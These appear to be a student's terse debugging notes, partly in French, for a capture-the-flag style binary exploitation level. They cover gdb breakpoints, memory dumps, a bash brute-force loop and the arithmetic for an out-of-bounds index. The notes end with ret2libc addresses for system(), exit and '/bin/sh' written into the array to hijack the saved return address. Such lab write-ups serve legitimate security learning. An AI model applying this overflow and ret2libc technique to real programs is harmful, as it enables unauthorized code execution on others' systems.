Partial RELRO   Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level07/level07

Ecrire un shellcode dans le tab
Ecraser le retour via l'overflow du tab
Quit pour exec ?


saved eip main : 0xf7e45513 (u_int : 4159916051)
4294967295 - 4159916051 = -135051244

4158964832

saved eip read : 0x8048930 (u_int : 134514224)

#!/bin/bash

for i in {4294967295..4294967500}; do
    sleep 0.01
    echo "read"
    sleep 0.01
    echo "$i"s
    echo "nb $i"
done | ~/level07

b *main+679

b *read_number+69


0xffffd458 = index 1 
(gdb) x/wx 0xffffd458
0xffffd458:     0xfffffffe

(gdb) x/wx 0xffffd458+452
0xffffd61c:     0xf7e45513

4294967295 = unsigned int max 
4158936339 = nb stored at data[114] = saved eip

-4294967182 = 114 aussi mais ne marche pas

0x8048930 = 134514992 = saved eip read_nb
0xffffd42c = 0x08048930

0xffffd408
0xffffd42c

find /w $ebp, +1000, 0x08048930


nput command: read
 Index: 4294967286
 Number at data[4294967286] is 134514992 (== 8048930)

 3735928559


saved eip 0x80488ef
0xffffd42c


b *get_unum+51
saved eip 0x8048656
0xffffd3fc:     0x08048656
92/4 = 23 octets

b *store_number+38
b *store_number+59

eax            0x72     114
ecx            0x72     114
edx            0xaaaaaaab       -1431655765

eax            0x72     114
ecx            0x72     114
edx            0xaaaaaaab       -1431655765

0x08048678 <+72>:    mul    %edx

eax            0x26     38
ecx            0x72     114
edx            0x4c     76

Le résultat est stocké sur 64 bits, réparti entre %eax (partie basse) et %edx (partie haute)

01001100 = 76
00100110 = 38

0x0804867a <+74>:    shr    %edx
edx            0x26     38


0x0804867c <+76>:    mov    %edx,%eax
eax            0x26     38
ecx            0x72     114
edx            0x26     38

 0x0804867e <+78>:    add    %eax,%eax
eax            0x4c     76

0x08048680 <+80>:    add    %edx,%eax
eax            0x72     114

0x08048682 <+82>:    mov    %ecx,%edx
eax            0x72     114
ecx            0x72     114
edx            0x72     114

0x08048684 <+84>:    sub    %eax,%edx
edx            0x0      0

eax            0x1cc    460

edx            0x2a     42

nombre * 0xaaaaaaab >> 33 ≈ nombre / 3

4,294,967,296 / 4 + 114 = 1073741938

0xffffd454 data ? + 4 = data[1] 0xffffd458 = 4294956120


Ret2libc = address of system() + return address for system() + address of "/bin/sh"


0x f7e6aed0 = 4159090384 system 114 1073741938
0x f7e5eb70 = 4159040368 exit   115
0x f7f897ec = 4160264172 bin/sh 116

